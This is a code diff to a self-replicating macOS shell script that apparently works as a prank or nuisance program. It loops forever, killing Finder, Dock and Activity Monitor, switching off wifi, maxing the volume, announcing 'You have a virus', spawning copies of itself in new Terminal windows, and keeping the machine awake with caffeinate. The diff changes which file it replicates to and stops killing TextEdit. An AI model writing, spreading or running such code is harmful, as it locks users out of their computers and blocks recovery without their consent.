@@ -3,8 +3,6 @@ while true; do
 #Kill Finder & Dock, to make it harder to launch new applications
 killall Finder
 killall Dock
-#kill TextEdit so you can't edit the scripts?
-killall TextEdit
 #Kill Activity Monitor, so you can't quit applications
 killall "Activity Monitor"
 #Kill wifi, just for fun
@@ -14,6 +12,10 @@ osascript -e 'beep'
 #Set the volume to max, then say "You have a virus"
 osascript -e "set volume 7"
 say You have a virus
-#Self-replicate
-open -a Terminal.app ~/child
+#Self-replicate.
+open -a Terminal.app ~/trollingnl
+#Check if it's parent, and if it is, caffeinate computer
+if [ $1 = "1" ]; then
+  caffeinate
+fi
 done
